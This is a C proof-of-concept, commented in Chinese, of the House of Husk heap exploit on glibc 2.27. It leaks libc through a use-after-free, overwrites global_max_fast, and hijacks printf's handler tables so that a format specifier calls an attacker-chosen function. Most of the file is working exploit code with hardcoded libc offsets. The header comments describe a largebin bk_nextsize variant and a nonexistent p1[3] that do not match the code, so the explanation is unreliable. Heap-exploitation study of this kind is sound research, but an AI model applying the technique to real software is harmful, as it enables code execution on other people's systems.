/*
 * 中文阅读提示：glibc 2.27 早期版本：固定偏移演示 printf 两张 handler 表的劫持。
 * 漏洞模型是 UAF 改 bk_nextsize；成功判据是两张 printf handler 全局指针
 * 都被写成受控 heap chunk，随后格式说明符索引到 backdoor。
 * 运行前必须用 readelf/nm/debug symbols 重算 MAIN_ARENA、PRINTF_* 偏移；
 * 同为 glibc 2.xx 并不保证作者给出的发行版偏移可直接使用。
 *
 * 分阶段阅读：
 *   1. 分配两组同 largebin 内“一大一小”的 chunk，并用 guard 隔开；
 *   2. free 大块后从 unsorted fd 泄露 main_arena，反算 libc 基址；
 *   3. 第一轮改大块 bk_nextsize，把小块地址写到 __printf_function_table；
 *   4. 第二轮把带有 callback 的 fake table 写到 __printf_arginfo_table；
 *   5. printf 解析指定格式符时按字符索引两张表，命中 backdoor。
 *
 * 代码中的 p1[3] 是用户区起算第 4 个 qword，对应 chunk header 的
 * bk_nextsize；target-0x20 来自 largebin 插入时写 bk_nextsize->fd_nextsize。
 */
/**
 * Husk 提出的 House of Husk 方法。
 * 本 PoC 的 hidden 符号偏移绑定 libc 2.27，其他 Build ID 必须重算。
 */
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>

#define offset2size(ofs) ((ofs) * 2 - 0x10)
#define MAIN_ARENA       0x3ebc40
#define MAIN_ARENA_DELTA 0x60
#define GLOBAL_MAX_FAST  0x3ed940
#define PRINTF_FUNCTABLE 0x3f0658
#define PRINTF_ARGINFO   0x3ec870

static volatile int backdoor_hit;

static void backdoor(void)
{
  static const char marker[] = "[+] HUSK_2.27_CALLBACK\n";
  backdoor_hit++;
  write(STDOUT_FILENO, marker, sizeof(marker) - 1);
}

int main (void)
{
  unsigned long libc_base;
  char *a[10];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL); // 关闭 stdout 缓冲，避免 printf 首次初始化提前扰动堆。

  /* 释放大块后通过 UAF 读取 unsorted fd，泄露 main_arena 并反算 libc 基址。 */
  a[0] = malloc(0x500); /* 该块是随后继续读取的 UAF victim。 */
  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));
  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));
  a[3] = malloc(0x500); /* 尾部保护块防止 a[0] 释放时与 top 合并。 */
  free(a[0]);
  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;

  /* 在 a[2] 中准备伪 printf arginfo 表，把 'X' 格式符槽设置为严格回调。 */
  /* 原文放 one-gadget，但 gadget 约束会把“表已被消费”与
     “寄存器/栈恰好满足”混在一起。改用本地 callback 做严格判据。 */
  *(unsigned long*)(a[2] + ('X' - 2) * 8) = (unsigned long)&backdoor;

  /* 修改 unsorted victim 的 bk，对 global_max_fast 发起经典 unsorted-bin 写。 */
  *(unsigned long*)(a[0] + 8) = libc_base + GLOBAL_MAX_FAST - 0x10;
  a[0] = malloc(0x500); /* 摘链副作用把 main_arena 地址写入 global_max_fast。 */

  /* global_max_fast 被放大后，大尺寸 free 也按 fastbin 索引写入，从而覆盖两个 printf 表指针。 */
  free(a[1]);
  free(a[2]);

  /* getchar 后调用 printf("%X")，解析 'X' 时应消费被劫持的 arginfo 表。 */
  getchar();
  printf("%X", 0);
  assert(backdoor_hit >= 1);
  
  return 0;
}
